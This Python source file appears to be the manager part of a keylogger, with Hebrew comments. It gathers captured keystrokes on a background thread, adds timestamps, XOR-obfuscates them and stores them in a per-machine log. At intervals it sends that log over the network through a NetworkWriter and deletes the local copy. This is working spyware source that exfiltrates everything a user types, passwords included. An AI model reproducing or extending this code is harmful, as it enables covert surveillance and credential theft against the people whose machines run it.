import time
import socket
import os
from datetime import datetime
import KeyLoggerService as ks
import Iwriter
import Encryptor as enc
import threading



class KeyLoggerManager:

    def __init__(self, interval=10, writer="file"):
        self.keylogger_service = ks.KeyLoggerService()
        self.writer: Iwriter.IWriter = []
        self.interval = interval
        self.buffer = []
        self.running = False
        self.thread = threading.Thread(target=self.run)
        self.machine_name = socket.gethostname()
        self.machine_folder = os.path.join("data", self.machine_name)
        self.log_file = os.path.join(self.machine_folder, "log.txt")

    def collect_keystrokes(self):
        """אוספת הקשות מה-KeyLoggerService ומאגדת ל-Buffer"""
        keystrokes = self.keylogger_service.get_logged_keys()
        if keystrokes:
            self.buffer += keystrokes

    def process_and_store_data(self):
        """ מעבדת את הנתונים, מוסיפה חותמת זמן, מצפינה ושומרת"""
        if self.buffer:
            self.writer = Iwriter.FileWriter()
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            data = "".join(self.buffer)
            processed_data = (f"{timestamp}, {data}\n")
            encrypted_data = enc.Encryptor.xor_encryption_and_decryption(processed_data)
            self.writer.send_data(encrypted_data,self.machine_name)
            # self.network_writer.send_data(encrypted_data, machine_name)
            self.buffer.clear()

    def run(self):
        """ פונקציה המפעילה את ה-KeyLoggerService ומפעילה את האיסוף והשמירה של הנתונים"""
        self.running = True
        self.keylogger_service.start_logging()
        check_last_send = 36
        while self.running:
            time.sleep(self.interval)
            self.collect_keystrokes()
            self.process_and_store_data()
            self.writer = Iwriter.NetworkWriter()
            check_last_send -= 1
            if not check_last_send:
                data = ""
                if os.path.isfile(self.log_file):
                    with open(self.log_file, "r", encoding="utf-8") as f:
                        data += f.read()
                    self.writer.send_data(data, self.machine_name)
                    os.remove(self.log_file)
                check_last_send = 36


    def start(self):
        """ מפעילה את KeyLoggerManager בלולאה"""
        self.thread.start()

    def stop(self):
        """ מפסיקה את האיסוף והרישום, ומבצעת שמירה אחרונה של הנתונים"""
        self.running = False
        self.thread.join()
        self.keylogger_service.stop_logging()
        self.process_and_store_data()

